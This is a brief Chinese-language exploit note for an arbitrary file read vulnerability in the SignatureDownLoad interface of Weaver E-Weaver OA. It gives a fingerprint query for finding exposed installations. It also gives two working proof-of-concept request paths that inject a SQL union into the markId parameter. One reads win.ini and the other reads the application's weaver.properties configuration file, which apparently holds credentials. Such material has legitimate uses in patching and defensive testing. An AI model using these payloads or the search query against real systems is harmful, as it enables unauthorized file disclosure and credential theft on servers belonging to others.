# 泛微OA E-Weaver SignatureDownLoad 任意文件读取漏洞

## 漏洞描述

泛微OA E-Weaver SignatureDownLoad接口存在任意文件读取漏洞，攻击者通过漏洞可以读取服务器任意文件

## 漏洞影响

<a-checkbox checked>泛微OA E-Weaver </a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="泛微-E-Weaver"</a-checkbox></br>

## 漏洞复现

![img](../../../.vuepress/public/img/1656689079056-8b37542f-8e1a-4558-a1b2-d863bbb2a136.png)

验证POC

```php
/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27C:/Windows/win.ini%27
```

![img](../../../.vuepress/public/img/1656689121217-b38a805a-342b-48d1-9b86-9655dccef5cd.png)

```php
/weaver/weaver.file.SignatureDownLoad?markId=0%20union%20select%20%27../ecology/WEB-INF/prop/weaver.properties%27
```

![img](../../../.vuepress/public/img/1656689196769-3dd2c9b1-43e6-4677-b0be-b170fba04a4b.png)